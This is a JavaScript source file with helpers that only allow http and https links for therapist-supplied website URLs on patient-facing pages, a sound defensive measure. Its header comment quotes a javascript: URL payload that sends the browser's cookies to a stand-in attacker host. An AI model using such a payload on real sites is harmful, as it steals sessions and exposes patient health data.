/**
 * URL sanitization helpers for user-supplied URLs that we render as
 * <a href="..."> on patient/admin-facing surfaces.
 *
 * The bug we're defending against: a therapist signs up with
 *   website: "javascript:fetch('https://attacker/'+document.cookie)"
 * and the patient who clicks the "Website" link on their results page
 * runs the script in their own browser session -- session theft + PHI
 * exfiltration through a one-line attack payload.
 *
 * Defense: an allowlist of safe schemes. Anything that isn't http://
 * or https:// gets rejected and we render a `#` href with a noop
 * onClick. Mailto / tel are intentionally NOT in the allowlist for
 * user-typed therapist website fields -- if a therapist puts
 * "mailto:..." in their website slot, that's a profile-completeness
 * issue, not a link we want to honor.
 *
 * The check is per-render and tiny; this is cheap defense-in-depth on
 * top of any input-side validation we add later.
 */

const SAFE_HTTP_RE = /^https?:\/\//i;

/**
 * Returns the URL if it's safe to use as an external href, or null
 * if it's not. Caller decides what to do on null (render plain text,
 * skip the link, render a disabled placeholder, etc.).
 *
 * - Strips leading/trailing whitespace
 * - Requires http:// or https:// scheme
 * - Rejects javascript:, data:, vbscript:, file:, about:, blob:, etc.
 * - Rejects schemeless inputs (no auto-prefix; that's the caller's job)
 * - Rejects empty / null / undefined
 */
export function safeExternalUrl(raw) {
  if (typeof raw !== "string") return null;
  const trimmed = raw.trim();
  if (!trimmed) return null;
  if (!SAFE_HTTP_RE.test(trimmed)) return null;
  // Belt + suspenders: reject anything that LOOKS like an http URL but
  // sneaks a colon-prefixed scheme through (e.g. " javascript:..." with
  // leading whitespace was caught above, but a URL like
  // "https://x.test/#javascript:alert(1)" is a fragment, NOT a scheme,
  // and is fine; the scheme check above is what matters).
  return trimmed;
}

/**
 * Convenience: returns true if the URL is safe to render.
 */
export function isSafeExternalUrl(raw) {
  return safeExternalUrl(raw) !== null;
}
